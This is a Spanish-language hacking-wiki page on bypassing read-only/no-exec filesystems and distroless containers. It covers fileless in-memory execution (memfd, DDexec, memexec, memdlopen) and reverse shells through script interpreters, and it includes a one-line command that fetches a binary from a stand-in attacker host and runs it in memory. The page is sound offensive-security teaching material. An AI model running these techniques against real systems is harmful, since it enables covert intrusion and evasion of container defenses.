# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Videos

En los siguientes videos puedes encontrar las técnicas mencionadas en esta página explicadas con más profundidad:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Es cada vez más común encontrar máquinas linux montadas con **protección de sistema de archivos de solo lectura (ro)**, especialmente en contenedores. Esto se debe a que ejecutar un contenedor con un sistema de archivos ro es tan fácil como establecer **`readOnlyRootFilesystem: true`** en el `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Sin embargo, incluso si el sistema de archivos está montado como ro, **`/dev/shm`** seguirá siendo escribible, por lo que es falso que no podamos escribir nada en el disco. Sin embargo, esta carpeta estará **montada con protección no-exec**, por lo que si descargas un binario aquí **no podrás ejecutarlo**.

> [!WARNING]
> Desde la perspectiva de un equipo rojo, esto hace que sea **complicado descargar y ejecutar** binarios que no están en el sistema ya (como puertas traseras o enumeradores como `kubectl`).

## Easiest bypass: Scripts

Ten en cuenta que mencioné binarios, puedes **ejecutar cualquier script** siempre que el intérprete esté dentro de la máquina, como un **script de shell** si `sh` está presente o un **script de python** si `python` está instalado.

Sin embargo, esto no es suficiente para ejecutar tu puerta trasera binaria u otras herramientas binarias que puedas necesitar ejecutar.

## Memory Bypasses

Si deseas ejecutar un binario pero el sistema de archivos no lo permite, la mejor manera de hacerlo es **ejecutándolo desde la memoria**, ya que las **protecciones no se aplican allí**.

### FD + exec syscall bypass

Si tienes algunos motores de script potentes dentro de la máquina, como **Python**, **Perl** o **Ruby**, podrías descargar el binario para ejecutarlo desde la memoria, almacenarlo en un descriptor de archivo de memoria (`create_memfd` syscall), que no estará protegido por esas protecciones y luego llamar a una **`exec` syscall** indicando el **fd como el archivo a ejecutar**.

Para esto, puedes usar fácilmente el proyecto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puedes pasarle un binario y generará un script en el lenguaje indicado con el **binario comprimido y codificado en b64** con las instrucciones para **decodificar y descomprimirlo** en un **fd** creado llamando a la syscall `create_memfd` y una llamada a la syscall **exec** para ejecutarlo.

> [!WARNING]
> Esto no funciona en otros lenguajes de scripting como PHP o Node porque no tienen ninguna **manera predeterminada de llamar a syscalls en bruto** desde un script, por lo que no es posible llamar a `create_memfd` para crear el **fd de memoria** para almacenar el binario.
>
> Además, crear un **fd regular** con un archivo en `/dev/shm` no funcionará, ya que no se te permitirá ejecutarlo porque se aplicará la **protección no-exec**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) es una técnica que te permite **modificar la memoria de tu propio proceso** sobrescribiendo su **`/proc/self/mem`**.

Por lo tanto, **controlando el código ensamblador** que se está ejecutando en el proceso, puedes escribir un **shellcode** y "mutar" el proceso para **ejecutar cualquier código arbitrario**.

> [!TIP]
> **DDexec / EverythingExec** te permitirá cargar y **ejecutar** tu propio **shellcode** o **cualquier binario** desde **memoria**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para más información sobre esta técnica, consulta el Github o:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es el siguiente paso natural de DDexec. Es un **DDexec shellcode demonizado**, por lo que cada vez que quieras **ejecutar un binario diferente** no necesitas relanzar DDexec, solo puedes ejecutar el shellcode de memexec a través de la técnica DDexec y luego **comunicarte con este demonio para pasar nuevos binarios para cargar y ejecutar**.

Puedes encontrar un ejemplo de cómo usar **memexec para ejecutar binarios desde un shell reverso de PHP** en [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con un propósito similar al de DDexec, la técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite una **manera más fácil de cargar binarios** en memoria para ejecutarlos más tarde. Podría incluso permitir cargar binarios con dependencias.

## Bypass Distroless

### Qué es distroless

Los contenedores distroless contienen solo los **componentes mínimos necesarios para ejecutar una aplicación o servicio específico**, como bibliotecas y dependencias de tiempo de ejecución, pero excluyen componentes más grandes como un gestor de paquetes, shell o utilidades del sistema.

El objetivo de los contenedores distroless es **reducir la superficie de ataque de los contenedores al eliminar componentes innecesarios** y minimizar el número de vulnerabilidades que pueden ser explotadas.

### Shell Reverso

En un contenedor distroless, es posible que **ni siquiera encuentres `sh` o `bash`** para obtener un shell regular. Tampoco encontrarás binarios como `ls`, `whoami`, `id`... todo lo que normalmente ejecutas en un sistema.

> [!WARNING]
> Por lo tanto, **no podrás** obtener un **shell reverso** o **enumerar** el sistema como lo haces normalmente.

Sin embargo, si el contenedor comprometido está ejecutando, por ejemplo, un flask web, entonces python está instalado, y por lo tanto puedes obtener un **shell reverso de Python**. Si está ejecutando node, puedes obtener un shell rev de Node, y lo mismo con casi cualquier **lenguaje de scripting**.

> [!TIP]
> Usando el lenguaje de scripting podrías **enumerar el sistema** utilizando las capacidades del lenguaje.

Si no hay protecciones de **`read-only/no-exec`**, podrías abusar de tu shell reverso para **escribir en el sistema de archivos tus binarios** y **ejecutarlos**.

> [!TIP]
> Sin embargo, en este tipo de contenedores, estas protecciones generalmente existirán, pero podrías usar las **técnicas de ejecución en memoria anteriores para eludirlas**.

Puedes encontrar **ejemplos** sobre cómo **explotar algunas vulnerabilidades RCE** para obtener shells reversos de lenguajes de scripting y ejecutar binarios desde la memoria en [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
